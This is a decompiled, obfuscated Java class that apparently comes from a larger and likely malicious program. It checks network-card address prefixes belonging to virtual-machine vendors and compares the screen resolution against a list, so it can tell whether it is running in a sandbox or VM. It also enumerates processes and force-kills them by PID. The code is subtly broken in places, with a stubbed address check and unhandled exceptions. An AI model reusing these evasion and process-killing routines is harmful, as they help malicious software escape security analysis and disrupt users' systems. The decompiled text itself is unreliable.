package net;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import net._v;
import net.cp.d;

public class m4 {
   private static final byte[][] x = new byte[][]{{(byte)0, (byte)5, (byte)105}, {(byte)0, (byte)28, (byte)20}, {(byte)0, (byte)12, (byte)41}, {(byte)0, (byte)80, (byte)86}, {(byte)8, (byte)39}, {(byte)10, (byte)39}, {(byte)0, (byte)3, (byte)-1}, {(byte)0, (byte)21, (byte)93}};
   private static final Dimension[] g = new Dimension[]{new Dimension(640, 360), new Dimension(800, 600), new Dimension(1024, 768), new Dimension(1280, 720), new Dimension(1280, 800), new Dimension(1280, 1024), new Dimension(1360, 768), new Dimension(1366, 768), new Dimension(1440, 900), new Dimension(1536, 864), new Dimension(1600, 900), new Dimension(1680, 1050), new Dimension(1920, 1080), new Dimension(1920, 1200), new Dimension(2048, 1152), new Dimension(2560, 1080), new Dimension(2560, 1440), new Dimension(3440, 1440), new Dimension(3840, 2160), new Dimension(4096, 2304), new Dimension(5120, 2880), new Dimension(3072, 1920), new Dimension(1680, 945), new Dimension(2048, 1152), new Dimension(2304, 1296), new Dimension(2560, 1440)};
   public static d J;

   public static boolean L() throws SocketException {
      return X() || !g();
   }

   public static boolean X() throws SocketException {
      Enumeration var0 = NetworkInterface.getNetworkInterfaces();

      while(var0.hasMoreElements()) {
         NetworkInterface var1 = (NetworkInterface)var0.nextElement();
         if(K(var1.getHardwareAddress())) {
            return true;
         }
      }

      return false;
   }

   public static int R() {
      String var0 = System.getProperty("os.name").toLowerCase();
      return var0.contains("win")?2:(var0.contains("mac")?3:(var0.contains("solaris")?1:(var0.contains("sunos")?1:(var0.contains("linux")?0:(var0.contains("unix")?0:4)))));
   }

   public static boolean K(byte[] var0) {
      return false;
   }

   public static boolean g() {
      Dimension var0 = Toolkit.getDefaultToolkit().getScreenSize();
      return V(var0);
   }

   public static boolean V(Dimension var0) {
      for(Dimension var4 : g) {
         if(var4.equals(var0)) {
            return true;
         }
      }

      return false;
   }

   public static boolean y(int var0) {
      net.u.d[] var1 = _v.L();
      Runtime var2 = Runtime.getRuntime();
      String[] var3 = new String[]{"cmd", "/c", "tasklist /FI \"PID eq " + var0 + "\""};
      Process var4 = var2.exec(var3);
      InputStream var5 = var4.getInputStream();
      InputStreamReader var6 = new InputStreamReader(var5);
      BufferedReader var7 = new BufferedReader(var6);

      String var8;
      while((var8 = var7.readLine()) != null) {
         if(var8.contains(" " + var0 + " ")) {
            return true;
         }
      }

      return false;
   }

   public static boolean Y(String var0, String var1) {
      Runtime var2 = Runtime.getRuntime();
      Process var3 = var2.exec(var1);
      InputStreamReader var4 = new InputStreamReader(var3.getInputStream());
      BufferedReader var5 = new BufferedReader(var4);
      String var6 = null;

      while((var6 = var5.readLine()) != null) {
         if(var6.contains(" " + var0 + " ")) {
            return true;
         }
      }

      return false;
   }

   public static boolean w(Integer var0) {
      String var1 = System.getProperty("os.name").toLowerCase();
      String var2;
      if(var1.contains("win")) {
         var2 = "cmd /c tasklist /FI \"PID eq " + var0 + "\"";
      } else {
         if(!var1.contains("nix") && !var1.contains("nux")) {
            return false;
         }

         var2 = "ps -p " + var0;
      }

      return Y(String.valueOf(var0), var2);
   }

   public static void Y(int var0) {
      (new Thread(() -> {
         Runtime.getRuntime().exec("Taskkill /PID " + var0 + " /F");
      })).start();
   }

   public static void d() {
      net.u.d[] var0 = _v.L();
      Runtime var1 = Runtime.getRuntime();
      String[] var2 = new String[]{"cmd", "/c", "tasklist"};
      Process var3 = var1.exec(var2);
      InputStream var4 = var3.getInputStream();
      InputStreamReader var5 = new InputStreamReader(var4);
      BufferedReader var6 = new BufferedReader(var5);
      StringBuffer var8 = new StringBuffer();
      String var7;
      if((var7 = var6.readLine()) != null) {
         System.out.println(var7);
         var8.append(var7).append("\n");
      }

   }

   private static Exception a(Exception var0) {
      return var0;
   }
}
